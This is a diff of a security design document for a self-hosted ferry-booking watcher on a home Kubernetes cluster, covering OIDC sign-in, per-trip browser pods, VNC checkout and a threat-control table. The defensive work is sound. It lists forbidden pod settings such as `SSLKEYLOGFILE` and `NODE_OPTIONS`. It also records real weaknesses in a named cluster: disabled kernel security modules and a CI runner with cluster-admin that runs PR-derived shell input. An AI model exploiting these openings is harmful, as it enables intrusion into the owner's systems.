@@ -2,8 +2,10 @@
 
 Status: revised design reference for the owner, after five adversarial reviews of the draft (security red
 team, cluster feasibility, product/UX, delivery/scope, completeness), then revised again for the owner's
-round-2 answers (identity by OIDC; guest checkout assumed, with no live spikes and only reversible choices;
-sandbox and kernel hardening optional; no pre-cart sign-in window). Appendix D lists every change and why.
+round-2 answers (identity by OIDC; guest checkout assumed, with no spike that tests it and only reversible
+choices; sandbox and kernel hardening proposed as optional, pending the owner's confirmation in Q12; no pre-cart
+sign-in window in v1), and corrected after three independent reviews of that revision. Appendix D lists every
+change and why.
 The owner's decisions in [decisions.md](decisions.md) are fixed; this document states what each one costs.
 Code refs are `file:line` in this repo at commit 1cdfca9. Cluster refs are `path:line` in
 `mchestr/home-cluster` at commit 0bff2f8 (paths under `kubernetes/apps/` unless stated). Research refs are
@@ -94,7 +96,7 @@ two different pods.
    the operator stays in maintenance mode until it passes.
 9. **Identity is app-native OIDC with a cookie-less app session.** ferry-web is an OIDC client of Authelia's
    existing provider and verifies the signed `id_token` itself; it then issues its own opaque bearer token,
-   which the SPA keeps and sends in `Authorization`. The app sets no cookie, so the dashboard route drops
+   which the SPA keeps and sends in `Authorization`, and re-verifies each session with the IdP every 24 h. The app sets no cookie, so the dashboard route drops
    every Cookie header and the owner's `chestr.dev` Authelia cookie never reaches the app, with no
    gateway-wide Lua and no new domain. Issuer, client and claims are config; replacing the IdP is a
    documented runbook (§6.2.6).
@@ -106,13 +108,14 @@ two different pods.
 - **Memory:** about 1-1.5 GiB per watched trip including the in-memory `/tmp` and `/dev/shm`, against 35-80 MB
   per extra context today [R:map-k8s-research §g]. At one browser per user, the owner's 8-24 GiB budget
   serves 4-23 concurrent users depending on measured pod size (§8.4).
-- **Effort:** about 18-22.5 focused weeks (89-112 days) for one developer to reach invitees outside the
+- **Effort:** about 18-22.5 focused weeks (90-113 days) for one developer to reach invitees outside the
   household, of which the owner is on the new stack after about 14-17. The arithmetic is in §12.3. Round 2
-  moved little in total: OIDC adds 3-4 days and fixture capture plus production detection 2-3, while the
-  live spikes, the sandbox work and M5 leave the plan.
+  moved little in total: OIDC adds 3-4 days, fixture capture plus production detection 2-3 and the review's
+  fixes about 1, while the live spikes, the sandbox work and M5 leave the plan.
 - **What the owner gives up:** logged-in checkout with saved cards and account-only fares (guest only,
-  accepted "for now"; reversible, §5.7); Chromium runs `--no-sandbox` unless the owner applies the optional
-  Talos hardening (R2); holds released by Talos upgrades in v1 (§7.8).
+  accepted "for now"; reversible, and the legacy app stays restorable until guest checkout has worked, §5.7,
+  §12.5); Chromium runs `--no-sandbox` unless the owner applies the optional Talos hardening (R2, Q12); holds
+  released by Talos upgrades in v1 (§7.8).
 
 ### Which design we started from, and why
 
@@ -140,11 +143,11 @@ k8s-native. The review then:
 |---|---|---|---|
 | 1 | Operator plus one headed pod per watched route; the operator can't get secrets out | One pinned bare pod per actively watched trip, created only by `ferry-control`, admitted by a VAP that forbids every secret-bearing field. The agent dials out, and its typed protocol has no page-content operations. No control-plane process is in the VNC data path. The VNC data path does cross Cloudflare, Envoy and vnc-edge in plaintext; see §4.3. | About 1-1.5 GiB per trip (§8.4). Every pod start is a fresh form walk and a possible Queue-it wait. The VAP and RBAC must stay correct forever; CI enforces this. |
 | 2 | Alerts link to the trip's VNC | Cart alerts link to `https://ferry.chestr.dev/c/<trip>`. That page shows the held sailing and two choices: "Check out on this device" (mints a ticket and opens VNC) or "I'll use my computer". | One extra tap, because a bearer VNC URL in a notification would hand VNC power to whoever sends the notification, and an automatic open would lock checkout to whichever device opened the link first. |
-| 3 | VNC only while a cart is held | Enforced in the pod (authoritative), by ferry-web (won't mint a ticket), by ferry-control (deletes the pod at hold cap + 5 min on its own clock), by Xvnc `-MaxConnectionTime`, and by `activeDeadlineSeconds`. | No "watch my browser" view. No pre-cart sign-in window (owner, round 2: old Q1, "No"); it stays a possible, reversible future option (§15). |
-| 4 | Invite-only; an admin approves each account | Three gates: Authelia issues sign-in codes for the `ferry-watch` client only to lldap groups `ferry-watch` and `admin` (an OIDC authorization policy, default deny); the app admits only people the admin invited on the Users page (§6.2.7); suspension revokes every session at once. | lldap users are still created by hand on a LAN-only UI, with no remote password reset [R:cluster-identity-security "lldap"]. Each invitee's email must be deliverable through SES before they can enrol a second factor (§2.3). |
+| 3 | VNC only while a cart is held | Enforced in the pod (authoritative), by ferry-web (won't mint a ticket), by ferry-control (deletes the pod at hold cap + 5 min on its own clock), by Xvnc `-MaxConnectionTime`, and by `activeDeadlineSeconds`. | No "watch my browser" view. No pre-cart sign-in window in v1 (owner, round 2: old Q1, "No"); adding one later needs the owner's explicit decision and real work (§15). |
+| 4 | Invite-only; an admin approves each account | Three gates: Authelia issues sign-in codes for the `ferry-watch` client only to lldap groups `ferry-watch` and `admin` (an OIDC authorization policy, default deny); the app admits only people the admin invited on the Users page (§6.2.7); suspension revokes every session at once. Authelia checks the group when it issues a code, so the app re-verifies every session with it at least every 24 h (§6.2.2). | lldap users are still created by hand on a LAN-only UI, with no remote password reset [R:cluster-identity-security "lldap"]. Each invitee's email must be deliverable through SES before they can enrol a second factor (§2.3). Removing someone in lldap reaches the app within 24 h, not at once, so the removal runbook suspends them in the app first (R20, §12.5). |
 | 5 | Operator-only | `entrypoint.sh` and the standalone image are retired. Local dev uses docker compose; chart work uses kind. | The owner's `config.json`/`alerted.json` need a one-time import (§12.5). |
 | 6 | Ko-fi link, no payments | A `kofiUrl` Helm value validated as `https://ko-fi.com/<name>`, rendered as a plain `<a>`. The CSP (`server.py:232-251`) is unchanged. | None worth noting. |
-| 7 | Start with Authelia and trusted headers; easy to replace; don't depend on Authelia. **Round 2: "Can we use oidc?"** | ferry-web is an OIDC Relying Party of Authelia's existing provider (confidential client, Authorization Code + PKCE S256) and verifies the `id_token` itself. It then issues its own opaque bearer token (no cookies), so the dashboard route has no gateway auth and drops every Cookie header. Identity sits behind an `IdentityProvider` interface; issuer, client and claim names are config; user ids are `hash(iss, sub)`. No Authelia-only feature is load-bearing. §6.2 gives the design, the alternatives and the replacement runbook. | About 3-4 more focused days than the header adapter (§12.3). The session token sits in localStorage, readable by any XSS on the dashboard origin (R17); unauthenticated requests now reach ferry-web (R19); the iOS home-screen redirect path needs a check on the owner's iPhone (R18). The VNC host cannot use the IdP, so ownership is checked cryptographically in the pod (D7). |
+| 7 | Start with Authelia and trusted headers; easy to replace; don't depend on Authelia. **Round 2: "Can we use oidc?"** | ferry-web is an OIDC Relying Party of Authelia's existing provider (confidential client, Authorization Code + PKCE S256) and verifies the `id_token` itself. It then issues its own opaque bearer token (no cookies), so the dashboard route has no gateway auth and drops every Cookie header. Identity sits behind an `IdentityProvider` interface; issuer, client and claim names are config; user ids are `hash(iss, sub)`. No Authelia-only feature is load-bearing. §6.2 gives the design, the alternatives and the replacement runbook. | About 3-4 more focused days than the header adapter (§12.3). The session token sits in localStorage, readable by any XSS on the dashboard origin (R17); unauthenticated requests now reach ferry-web (R19); the iOS home-screen redirect path needs a check on the owner's iPhone (R18); IdP changes reach the app at the next 24-hourly re-verification, not on every request (R20); Authelia's `sub` follows the username (R21). The VNC host cannot use the IdP, so ownership is checked cryptographically in the pod (D7). |
 | 8 | Per-user limits on watched routes | `maxTrips` 3 stored, `maxActiveBrowsers` 1 watched at once (owner, during review), both admin-configurable per user and clamped by GitOps ceilings, enforced in five layers (§9). | A small admin Users page and a limits resolver. |
 | 9 | Reap unused browsers; no misuse | Disposable pods (`restartPolicy: Never`), recycled after every viewed hold and at about 24 h, plus hold caps, kiosk mode, policies and the egress allowlist. | More pod churn means more Queue-it visits, which the budget (D12) absorbs. |
 | Alerts | No Pushover; Web Push plus email | ferry-web sends from a Postgres outbox. Web Push is the default; email carries cart alerts and is the fallback. | A service worker, VAPID handling and SES production access (§2.3). |
@@ -163,7 +166,7 @@ k8s-native. The review then:
 | Envoy Gateway runs Lua only if `extensionApis.enableLua: true` (upstream EG v1.9 `tasks/extensibility/lua.md`); it is not set here (`networking/envoy-gateway/app/helmrelease.yaml:14-20`). | The draft's Lua cookie filter would need a gateway-wide change. It is not needed: the app sets no cookie, so the route removes the whole Cookie header (§6.2.3). |
 | The EnvoyProxy sets no access log (`envoy.yaml:19-43`), so Envoy Gateway's default stdout access log applies and records request paths. | No secret ever appears in a path or query string (C15). |
 | Authelia: session cookie `authelia-home-ops` on `chestr.dev`, 3 d inactivity, 7 d expiry, 6 months with remember-me (`default/authelia/app/resources/configuration.yaml:32-41`); `default_policy: two_factor`, last rule denies `*.chestr.dev` (`:45-104`); 3 failures in 1 h ban for 1 day (`:27-30`); password reset disabled (`:23-24`); every OIDC client is `two_factor` with no `authorization_policies` (`:131-214`). | The `ferry-watch` OIDC client gets its own `authorization_policies` entry (groups `ferry-watch` and `admin`, default deny). Access-control rules do not apply to OIDC authorizations, and no ferry host is behind forward-auth, so no rule is added. Invitees enrol a second factor through an emailed code (SES). Existing clients are restricted before anyone new joins lldap (hard gate). |
-| Authelia's OIDC clients here use `require_pkce: true`, `pkce_challenge_method: S256`, `pre_configured_consent_duration: 1y` and `claims_policy: default`, which puts `groups`, `email`, `email_verified`, `preferred_username` and `name` in the `id_token` (`configuration.yaml:123-127`, `:131-214`). Client id, secret and argon2 hash live in the 1Password item `authelia` (`default/authelia/app/README.md`); Authelia reads the hash (`default/authelia/app/externalsecret.yaml`) and each consumer reads id and secret through its own ExternalSecret (`observability/grafana/instance/externalsecret.yaml:20-38`). Authelia's route is on envoy-external (`default/authelia/app/helmrelease.yaml:147-153`). Upstream v4.39.28: `sub` is an opaque per-user UUID (`docs/.../openid-connect-1.0-claims.md`); `prompt=none` answers `login_required` or `consent_required` (`internal/handlers/handler_oauth2_authorization.go:122-127`, `handler_oauth2_authorization_consent_preconfigured.go:132-138`); pre-configured consent holds only for identical scopes (`clients.md`, `pre_configured_consent_duration`); `response_modes` may list `fragment` (`internal/configuration/validator/identity_providers.go:1153-1189`). | ferry-web registers as one more client in the same pattern (§6.2.3) and always requests the same scopes. A uid is known only after a person's first sign-in, so invitations bind at first sign-in (§6.2.7). The code comes back in the URL fragment, so it never reaches an access log (C15; runtime acceptance with `response_type=code` is checked in S-OIDC). ferry-web's egress to the issuer goes to the envoy-external pods (§7.6). |
+| Authelia's OIDC clients here use `require_pkce: true`, `pkce_challenge_method: S256`, `pre_configured_consent_duration: 1y` and `claims_policy: default`, which puts `groups`, `email`, `email_verified`, `preferred_username` and `name` in the `id_token` (`configuration.yaml:123-127`, `:131-214`). Client id, secret and argon2 hash live in the 1Password item `authelia` (`default/authelia/app/README.md`); Authelia reads the hash (`default/authelia/app/externalsecret.yaml`) and each consumer reads id and secret through its own ExternalSecret (`observability/grafana/instance/externalsecret.yaml:20-38`). Authelia's route is on envoy-external (`default/authelia/app/helmrelease.yaml:147-153`). Upstream v4.39.28: `sub` is an opaque UUID created on first use **per username** and reused for that username (`internal/oidc/store.go:76-101`, `GetSubject`/`GenerateOpaqueUserID`); the client's authorization policy, and the refresh of the user from LDAP (`refresh_interval: 1m`, `configuration.yaml:25`), are applied only when Authelia handles an authorization request (`internal/handlers/handler_oauth2_authorization_consent_core.go:35-80`); `prompt=none` answers `login_required` or `consent_required` (`internal/handlers/handler_oauth2_authorization.go:122-127`, `handler_oauth2_authorization_consent_preconfigured.go:132-138`); pre-configured consent holds only for identical scopes (`clients.md`, `pre_configured_consent_duration`); `response_modes` may list `fragment` (`internal/configuration/validator/identity_providers.go:1153-1189`). | ferry-web registers as one more client in the same pattern (§6.2.3) and always requests the same scopes. A uid is known only after a person's first sign-in, so invitations bind at first sign-in (§6.2.7). A reused lldap username would inherit the old person's `sub` and uid, so usernames are never reused (R21). Group removal reaches the app only when the session next goes back to Authelia, so sessions are re-verified every 24 h (§6.2.2, R20). The code comes back in the URL fragment, so it never reaches an access log (C15; runtime acceptance with `response_type=code` is checked in S-OIDC). ferry-web's egress to the issuer goes to the envoy-external pods (§7.6). |
 | `*.chestr.dev` reaches envoy-external through a Cloudflare tunnel (`networking/cloudflared/app/resources/config.yaml:5-11`). | Cloudflare's edge and cloudflared see plaintext HTTP and WebSocket frames, including VNC keystrokes (§4.3, R4). |
 | Only single-label `*.chestr.dev` is covered by the cert and the tunnel. external-dns (Cloudflare: `--gateway-name=envoy-external`, `networking/external-dns/cloudflare/helmrelease.yaml:31-38`; UniFi: all HTTPRoutes, `unifi/helmrelease.yaml:48`) and gatus (`--auto-httproute`, `observability/gatus/app/helmrelease.yaml:25`) react to every HTTPRoute. HTTPS listeners accept routes from any namespace. | Two static hosts, `ferry.chestr.dev` and `ferry-checkout.chestr.dev`. No app identity writes HTTPRoutes. Before cutover the dashboard runs on `ferry-next.chestr.dev` (§12.5). |
 | `components/common` injects the Flux GitHub token, registry credentials and cluster-secrets. `default` has privileged pods and Authelia's Dragonfly. | The browser namespace is created by the chart without `components/common`, and is never `default`. |
@@ -174,11 +177,11 @@ k8s-native. The review then:
 | Fluent Bit ships every pod's logs to VictoriaLogs, unauthenticated in-cluster. Stock alerts page the owner on Pushover. | The browser namespace is excluded from Fluent Bit and its stock alerts are silenced. |
 | smtp-relay (maddy to SES) at `smtp-relay.default:2525` admits only Authelia and lldap. | One home-cluster NetworkPolicy rule admits `ferry-web` only. |
 | Multus (macvlan `multus-iot`) is installed. | The VAP denies the `k8s.v1.cni.cncf.io/networks` annotation. |
-| Talos kernel args are `apparmor=0 security=none mitigations=off`. | A risk-acceptance choice, not a functional requirement, explained in plain terms in R2. Changing it, and enabling Chromium's sandbox, is optional hardening: the owner's call, recommended before inviting people the owner doesn't know well, not a gate (owner, round 2). |
+| Talos kernel args are `apparmor=0 security=none mitigations=off` (`talos/schematic.yaml:6,11,12`), on Intel nodes (`:9,17`). All three nodes are control-plane nodes that also run workloads (`talos/controlplane.yaml:191`, `allowSchedulingOnControlPlanes: true`). | A risk-acceptance choice, not a functional requirement, explained in plain terms in R2, including what a kernel escape reaches here (node root next to etcd and the API server). Changing the flags, and enabling Chromium's sandbox, is proposed as optional hardening, recommended before inviting people the owner doesn't know well, and not a gate. That is the planner's recommendation; the owner asked why it was needed and has not yet decided (Q12). |
 | A self-hosted GitHub runner `home-cluster-runner` has `cluster-admin` and Talos `os:admin` (`actions-runner-system/actions-runner-controller/runners/home-cluster/rbac.yaml:9-25`, `talos/controlplane.yaml:85-88`) and runs a `pull_request` workflow that interpolates PR-derived values into a shell command (`.github/workflows/image-pull.yaml:5-7,95-109`). | A hard gate before non-household invitees (§2.3, R1). |
-| The ClientTrafficPolicy trusts XFF from 10.42/16, but pods are on 10.244/16. | Nothing here keys on client IP. Rate limits are per user. |
+| The ClientTrafficPolicy trusts XFF from 10.42/16, but pods are on 10.244/16. | Envoy's idea of the client address is not usable. After sign-in, rate limits are per user. Before sign-in they key on `CF-Connecting-IP`, which Cloudflare's edge sets (a request reaching envoy-external from the LAN can forge it, so a global ceiling stays as the backstop; §6.3, R19). |
 | Cloudflare geo-blocks every country except CA/US/CN; Rocket Loader and email obfuscation are zone-wide. | Invitees must be in CA/US/CN, including when travelling (Q11). A Cloudflare rule turns both features off for the ferry hosts. |
-| The current deployment `default/ferry-watch` reads `BCF_USER`/`BCF_PASS` from 1Password item `ferry-watch` and the `pushover` item (`default/ferry-watch/app/externalsecret.yaml:14-23`); `pushover` is also used by kube-prometheus-stack, gatus, sonarr, radarr and qbittorrent. The Kustomization prunes (`default/ferry-watch/ks.yaml:26`) and includes the VolSync component. | The cutover keeps the legacy app scaled to zero with its PVC until the soak ends, removes only ferry-watch's *reference* to `pushover`, and then deletes the BC Ferries fields (§12.5). |
+| The current deployment `default/ferry-watch` reads `BCF_USER`/`BCF_PASS` from 1Password item `ferry-watch` and the `pushover` item (`default/ferry-watch/app/externalsecret.yaml:14-23`); `pushover` is also used by kube-prometheus-stack, gatus, sonarr, radarr and qbittorrent. The Kustomization prunes (`default/ferry-watch/ks.yaml:26`) and includes the VolSync component. | The cutover keeps the legacy app scaled to zero with its PVC and the BC Ferries fields until a real guest checkout has worked on the new stack (not after a fixed time), removes only ferry-watch's *reference* to `pushover`, and only then deletes the BC Ferries fields (§12.5). The legacy app is today's only logged-in checkout path. |
 
 ### 2.3 Prerequisites, with fallbacks if a feature is missing
 
@@ -186,12 +189,12 @@ k8s-native. The review then:
 |---|---|---|---|
 | Cilium `dnsProxy.dnsRejectResponseCode: nameError` | home-cluster | W0 (S-CIL) | Add `*.svc.cluster.local`-style patterns to every DNS rule and keep fully qualified names. |
 | Cilium DNS proxy works for `toFQDNs` (S-CIL) | spike | M1 | `toCIDRSet` 0.0.0.0/0 minus private, CGNAT and link-local ranges (today's rule), plus the Chromium URL allowlist. |
-| Authelia OIDC client for Ferry Watch (confidential, PKCE S256, scopes `openid profile email groups`, `response_modes: [fragment]`, redirect URIs on `ferry.chestr.dev` and, until cutover, `ferry-next.chestr.dev`, `claims_policy: default`, pre-configured consent 1y) plus an `authorization_policies` entry `ferry-watch` (groups `ferry-watch` and `admin` at `two_factor`, default deny); id, secret and hash generated with the `default/authelia/app/README.md` script (`APP=FERRY_WATCH`) | owner + home-cluster | M1 (S-OIDC in W0) | If Authelia refuses `response_mode=fragment` with `response_type=code` at runtime: `query` mode, with the code in Envoy's access log stated as an exception to C15 (single use, 1-minute lifespan, useless without the PKCE verifier and the client secret). Otherwise none needed: it is the cluster's usual client pattern. |
+| Authelia OIDC client for Ferry Watch (confidential, PKCE S256, scopes `openid profile email groups`, `response_modes: [fragment]`, redirect URIs on `ferry.chestr.dev` and, until cutover, `ferry-next.chestr.dev`, `claims_policy: default`, pre-configured consent 1y) plus an `authorization_policies` entry `ferry-watch` (groups `ferry-watch` and `admin` at `two_factor`, default deny); id, secret and hash generated with the `default/authelia/app/README.md` script (`APP=FERRY_WATCH`) | owner + home-cluster | M1 (S-OIDC in W0) | If Authelia refuses `response_mode=fragment` with `response_type=code` at runtime: `query` mode, with the code in Envoy's access log stated as an exception to C15 (single use, 1-minute lifespan, useless without the PKCE verifier; the client secret is no extra barrier, because `/auth/session` exchanges any posted code and verifier with ferry-web's own secret). Otherwise none needed: it is the cluster's usual client pattern. |
 | Authelia OIDC `authorization_policies` restricting Immich, Windmill, Grafana, Autobrr and Paperless to their groups; lldap group `ferry-watch` | home-cluster | **before any new person is added to lldap** | none (hard gate on M2) |
 | Each invitee's email deliverable through SES (production access, or the invitee verified as an SES identity first) | owner | before each invitee is created | none: Authelia's second-factor enrolment emails a one-time code [R:cluster-identity-security]. |
 | CNPG managed roles `ferrywatch_web` and `ferrywatch_control` on `postgres17`, with password ExternalSecrets in `database` | home-cluster | M1 | One login role for both processes, as a stated weakening of C24 until fixed. |
 | 1Password fields. Item `ferry-watch`: VNC ticket Ed25519 private key, VAPID private key. Item `authelia`: `FERRY_WATCH_OAUTH_CLIENT_ID`, `FERRY_WATCH_OAUTH_CLIENT_SECRET`, `FERRY_WATCH_OAUTH_CLIENT_SECRET_HASH`. Item `cloudnative-pg`: `ferrywatch_postgres_{username,password}`, `ferrywatch_web_password`, `ferrywatch_control_password`. | owner | M1 | none |
-| *Optional (backlog), not a prerequisite:* Talos `user.max_user_namespaces` sysctl **and** a `machine.seccompProfiles` Localhost profile, applied per node (S-SBX) | owner (`task talos:apply-node`), if and when they choose | — (recommended before inviting people the owner doesn't know well) | `--no-sandbox` stays (R2). Not a gate unless the owner later makes it one. |
+| *Optional (backlog), not a prerequisite:* Talos `user.max_user_namespaces` sysctl **and** a `machine.seccompProfiles` Localhost profile, applied per node (S-SBX) | owner (`task talos:apply-node`), if and when they choose (Q12) | — (recommended before inviting people the owner doesn't know well) | `--no-sandbox` stays (R2). Not a gate unless the owner makes it one. |
 | `home-cluster-runner` restricted: push/schedule events or same-repo PRs only, approval for outside contributors, matrix values via `env:` | owner (home-cluster) | M3 | none (hard gate before non-household invitees) |
 | Measured browser memory (S-MEM) | spike | M1 | Start at `browserMemoryBudget: 12Gi`, `podMemory: 1.5Gi`, so `maxBrowsersTotal = 7` (§8.4). |
 | Multi-issuer 3DS learning run (S-3DS) | owner + household | M3 | Non-household invitees wait; or Q8 option (b). |
@@ -229,7 +232,7 @@ changes is stated in C3 and §4.5.
                    envoy-external (Envoy Gateway 1.9.2)
           +-----------------------+---------------------------------------+
   ferry.chestr.dev (static HTTPRoute, no gateway auth)   ferry-checkout.chestr.dev (static HTTPRoute, no gateway auth)
-  RequestHeaderModifier removes Cookie;                  RequestHeaderModifier removes Cookie, Authorization
+  RequestHeaderModifier removes Cookie, Remote-*;        RequestHeaderModifier removes Cookie, Authorization
   Authorization kept (the app's own bearer token)
   auth.chestr.dev (Authelia, OIDC issuer) is on the same gateway
           |                                                            |
@@ -287,7 +290,7 @@ Five facts make per-user routing work, including when several people check out a
 
 | TB | Boundary | Mechanism |
 |---|---|---|
-| TB1 | Internet → ferry-web | No gateway auth; the route removes every Cookie header. The app verifies sign-in itself (OIDC code + PKCE, signed `id_token`) and then requires its own opaque bearer session on every API call and as the dashboard WebSocket's first message (C29). The existing Origin and JSON checks on mutations (`server.py:220-229`). Unauthenticated requests reach only the static shell, `/auth/*` and 401s (R19). |
+| TB1 | Internet → ferry-web | No gateway auth; the route removes every Cookie header (and the dev header adapter's `Remote-*` names). The app verifies sign-in itself (OIDC code + PKCE, signed `id_token`) and then requires its own opaque bearer session on every API call and as the dashboard WebSocket's first message (C29). The existing Origin and JSON checks on mutations (`server.py:220-229`). Unauthenticated requests reach only the static shell, `/auth/*` and 401s (R19). |
 | TB2 | Internet → vnc-edge → pod | Static routing. nginx forwards only upgrades matching the path regex. The in-pod gate verifies the ticket and the first-viewer lock. Origin is pinned. Cookie and Authorization are removed. |
 | TB3 | Browser pod → ferry-control | Projected token (audience `ferry-watch-agent`, 600 s) checked by TokenReview and bound to the `browser_pods` row written before the pod was created. A strict schema with size caps. Treated as forgeable for its own trip only. |
 | TB4 | ferry-web ↔ ferry-control | Only Postgres rows and NOTIFY, under per-role GRANTs, row-level security (RLS) and triggers. No RPC. |
@@ -363,8 +366,8 @@ Numbers below are the defaults from the canonical table in §8.2.
    against a constant origin. If the app session has lapsed, the SPA redirects to Authelia's authorization
    endpoint, which sends the browser straight back while the Authelia session is alive, and returns to
    `/c/<trip>` (§6.2.4). `/c/<trip>` shows the sailing, the deadline, and three choices, with the copy
-   "Checkout will be locked to the device you choose" and "Check out as a guest: signing in to BC Ferries
-   during checkout can empty this cart" (§5.7):
+   "Checkout will be locked to the device you choose" and "Check out as a guest. Don't sign in to BC Ferries
+   here: it doesn't accept a sign-in while a cart is held" (§5.7):
    - **Check out on this device** POSTs `/api/trips/<trip>/vnc`. ferry-web checks that the user owns the
      trip, that `trip_state` shows a READY cart with this `cart_id` in the current pod, and that the user
      has made fewer than 10 mints this minute. It mints a ticket (§5.5), writes `vnc_mints` and audit rows,
@@ -403,16 +406,17 @@ Numbers below are the defaults from the canonical table in §8.2.
    `booked` when the agent saw BC Ferries' confirmation step (selector from the confirmation page captured
    during the owner's M1 use; until then the user's "Did you book it?" answer records it; no booking
    reference crosses the protocol). Any visit to the login page or an account-required page during the
-   checkout was reported as `event{checkout_login_seen}` (§5.7).
+   checkout was reported as `event{checkout_login_seen, forced}`, where `forced` says the site sent the
+   checkout there rather than the user choosing to go (§5.7).
 8. **Recycle.** The fleet loop records the pod Succeeded and deletes it.
    - `outcome = booked`: ferry-control archives the trip and inserts a "Booked!" notification (with the Ko-fi
      link on the screen it opens).
    - Otherwise ferry-control sets `paused_reason='after_checkout'` and inserts a `booked_it` notification
      ("Did you book it?"). "Yes" archives the trip; "No, keep watching" (with an optional one-tap reason:
-     "the site wanted me to sign in", "payment failed", "checkout broke", "ran out of time", "changed my
-     mind") or **no answer within 20 min** resumes watching with a new pod `fw-<trip>-g<n+1>`. The trip keeps
-     its slot at the head of the queue for 30 min. Answers and reasons feed `ferrywatch_holds_total{outcome}`
-     and the guest-checkout alert (§5.7).
+     "the site wanted me to sign in", "I tried to sign in", "payment failed", "checkout broke", "ran out of
+     time", "changed my mind") or **no answer within 20 min** resumes watching with a new pod
+     `fw-<trip>-g<n+1>`. The trip keeps its slot at the head of the queue for 30 min. Answers and reasons feed
+     `ferrywatch_holds_total{outcome}`, the hold-outcome record and the guest-checkout alert (§5.7).
    - The viewed departure stays in `alerted`, so it is never re-carted (C22).
 9. **Unviewed expiry.** If no viewer ever connected, the cart is emptied and the release checked (§5.2)
    after 30 min (reminder at 15). The user gets `cart_expired`, with "Still bookable: book on bcferries.com" when the last
@@ -429,7 +433,7 @@ Numbers below are the defaults from the canonical table in §8.2.
 | Interval and brake | ferry-control (computes; brake persisted in `fleet_state`) | agent local bucket |
 | Alert memory (`alerted`, `offered`) | the agent decides; ferry-control persists it in `alert_memory` | `configure` on reconnect |
 | Who may see the VNC view | **the pod**: ticket, `FW_OWNER`, cart, lock | ferry-web only decides whether to mint |
-| Who the user is | the IdP's signed `id_token` at sign-in (`iss`, `sub`), verified by ferry-web; afterwards ferry-web's own session row | ferry-web maps `(iss, sub)` to a uid (§6.2.6) |
+| Who the user is | the IdP's signed `id_token` at sign-in and at each 24-hourly re-verification (`iss`, `sub`), verified by ferry-web; in between, ferry-web's own session row | ferry-web computes the uid from `(iss, sub)` and the GitOps aliases (§6.2.6) |
 
 ---
 
@@ -465,7 +469,7 @@ everything (R1).
 
 | Value | Browser pod | ferry-control (operator) | ferry-web | vnc-edge | Envoy | Cloudflare edge + cloudflared | Postgres | Logs (VictoriaLogs) |
 |---|---|---|---|---|---|---|---|---|
-| Card number, CVV, 3DS codes, guest contact details (typed over VNC) | yes (own tenant only) | **no** | **no** | yes (RFB is plaintext) | yes | yes | no | no |
+| Card number, CVV, 3DS codes, guest contact details (typed over VNC); a BC Ferries password, if a user signs in during checkout despite the advice (§5.7) | yes (own tenant only) | **no** | **no** | yes (RFB is plaintext) | yes | yes | no | no |
 | BC Ferries guest cart cookie | yes (own) | no | no | no | no | no | no | no |
 | VNC ticket (60 s, single use) | verifies it | no | mints it | yes (subprotocol header) | yes (header, not logged) | yes | `jti` only | no |
 | Resume nonce `N` | stores `sha256(N)` | no | **no** | yes | yes | yes | no | no |
@@ -486,7 +490,7 @@ once TLS ends; tenants are told (R4).
 
 | # | Control | Threat it stops | Where enforced | From |
 |---|---|---|---|---|
-| C1 | Guest mode only. No API accepts BC Ferries credentials. The VAP forbids secret volumes, `envFrom` and `valueFrom`. The login code stays in the agent behind a flag v1 images never set (§5.7). | A password or account cookie leaking from anywhere | agent build (`credentials=None`), API, VAP `fw-browser-pod` | M1 |
+| C1 | Guest mode only. No API accepts BC Ferries credentials. The VAP forbids secret volumes, `envFrom` and `valueFrom`. The login code stays in the agent behind a flag v1 images never set (§5.7). | A *stored* BC Ferries password or account cookie leaking from any component. (A password a user types into bcferries.com during checkout is exposed like card data, R4 and R2; the copy advises against it, §5.7.) | agent build (`credentials=None`), API, VAP `fw-browser-pod` | M1 |
 | C2 | ferry-web has no Kubernetes token and no RBAC | A1 shaping pods, reading Secrets, exec | chart: `automountServiceAccountToken: false`; helm-unittest | M1 |
 | C3 | Only ferry-control may create pods in the browser namespace; it has no internet ingress and its only input is the strict agent protocol from browser pods | Internet-reachable code holding `pods/create`. **Changed from the draft:** a parser exploit by A3/A4 now reaches `pods/create` too (still VAP-pinned; see §4.5). | VAP `fw-browser-pod` (creator check); NetworkPolicy; RBAC | M1 |
 | C4 | Exact pod template: digest-pinned image, a fixed env list with literal values, fixed volumes, no command/args/hooks/exec probes/extra containers/hostAliases/dnsConfig/nodeName/runtimeClass/Multus annotation/ownerReferences | "create pods = read Secrets"; `DEBUG=pw:*`, `SSLKEYLOGFILE`, `NODE_OPTIONS`, base-URL redirection, sidecars | VAP `fw-browser-pod` with GitOps params; PSA `restricted` | M1 |
@@ -495,26 +499,26 @@ once TLS ends; tenants are told (R4).
 | C7 | The agent dials out with a typed protocol that has no navigate, URL, JS, screenshot, cookie, storage, base_url or log-level operation | The operator extracting page content or steering the browser | `ferry_watch_core.protocol` (strict msgspec, unknown fields rejected); a CI test walks the schema | M1 |
 | C8 | Projected token (audience `ferry-watch-agent`, 600 s), TokenReview, binding to the `browser_pods` row the fleet loop wrote before creating the pod; every message's trip must match | A pod impersonating another pod or trip; a token replayed against the API server | ferry-control | M1 |
 | C9 | Agent output is forgeable for its own trip only: schema caps, typed alert kinds, no free text into alerts, links only from web templates | A3 phishing through alerts or poisoning other tenants | ferry-control (validation) + ferry-web (rendering) | M1 |
-| C10 | VNC ticket: Ed25519, 60 s, single-use `jti`, bound to `sub == FW_OWNER`, trip, pod and `cart_id`; public key pinned by the VAP | Cross-tenant VNC, ticket replay, a stale cart | in-pod gate | M1 |
+| C10 | VNC ticket: Ed25519, 60 s, single-use `jti`, bound to `sub == FW_OWNER`, trip, pod and `cart_id`; public key pinned by the VAP; `aud` names the purpose and v1's gate accepts only `fw-vnc` (checkout, which requires a held cart) | Cross-tenant VNC, ticket replay, a stale cart | in-pod gate | M1 |
 | C11 | First-viewer lock: after the first accept, only the holder of nonce `N` can connect; tickets are ignored for that cart; the check-and-set is one synchronous step | A compromised **ferry-web** taking over a session after the user connected. It does **not** constrain a compromised vnc-edge, Envoy or Cloudflare, which see `N` (R4). | in-pod gate | M1 |
 | C12 | Single viewer: one socket at the gate (a reconnect with `N` replaces it) and Xvnc `-NeverShared -DisconnectClients=0` | Silent co-viewing | gate + Xvnc | M1 |
 | C13 | Xvnc serves RFB only on a unix socket (`-rfbunixpath`, mode 0600) with no TCP or WebSocket listener and no `-httpd` | Page JS opening a loopback socket and reading the framebuffer past the payment iframe's isolation. Browsers have no AF_UNIX API. (A3, as uid 1001, can open the socket; it already owns that session.) | agent supervisor; self-test asserts no extra listeners | M1 |
